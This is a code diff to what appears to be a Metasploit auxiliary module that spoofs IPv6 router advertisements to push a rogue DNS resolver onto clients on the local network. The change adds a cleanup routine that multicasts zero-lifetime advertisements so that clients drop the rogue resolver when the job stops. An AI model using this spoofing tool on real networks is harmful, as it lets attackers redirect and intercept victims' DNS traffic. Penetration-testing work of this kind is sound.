@@ -98,8 +98,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def cleanup
     super
+    # Stop the advertiser first so the withdrawal below is the only thing
+    # touching the pcap handle (injection is otherwise serialised on the
+    # service thread).
     @ra_thread&.kill
     @ra_thread = nil
+
+    # Best-effort teardown: tell clients to drop the rogue RDNSS entry now
+    # instead of leaving them pointed at us for the RDNSS lifetime. The
+    # advertised lifetime is effectively infinite, so without this a coerced
+    # client keeps using a dead resolver after the job stops. Not guaranteed
+    # (a hard kill skips cleanup), but strictly better than leaving it.
+    send_ra_withdrawal if @ra_pcap_open
+
     close_pcap if @ra_pcap_open
     @ra_pcap_open = false
   end
@@ -178,15 +189,30 @@ class MetasploitModule < Msf::Auxiliary
     true
   end
 
-  def build_ra_dns_packet(dst_mac: '33:33:00:00:00:01', dst_addr: 'ff02::1')
+  def build_ra_dns_packet(dst_mac: '33:33:00:00:00:01', dst_addr: 'ff02::1', router_lifetime: @ra_router_lifetime, dns_lifetime: 0xFFFFFFFF)
     ipv6_build_ra_dns_packet(
       @ra_smac,
       [datastore['SPOOF_IP6']],
       shost: @ra_shost,
       domains: @ra_domains,
-      router_lifetime: @ra_router_lifetime,
+      router_lifetime: router_lifetime,
+      dns_lifetime: dns_lifetime,
       dst_mac: dst_mac,
       dst_addr: dst_addr
     )
+  end
+
+  # Multicast a final RA that zeroes the RDNSS (and router) lifetime so clients
+  # stop using us as their resolver as soon as the job ends. Sent a few times
+  # because RAs are unacknowledged multicast and can be dropped.
+  def send_ra_withdrawal
+    withdrawal = build_ra_dns_packet(router_lifetime: 0, dns_lifetime: 0)
+    3.times do
+      inject(withdrawal.to_s)
+      Rex.sleep(0.1)
+    end
+    print_status("Withdrew the rogue RDNSS advertisement (RDNSS lifetime 0) for #{datastore['SPOOF_IP6']}")
+  rescue StandardError => e
+    vprint_error("Could not send RA withdrawal on cleanup: #{e}")
   end
 end
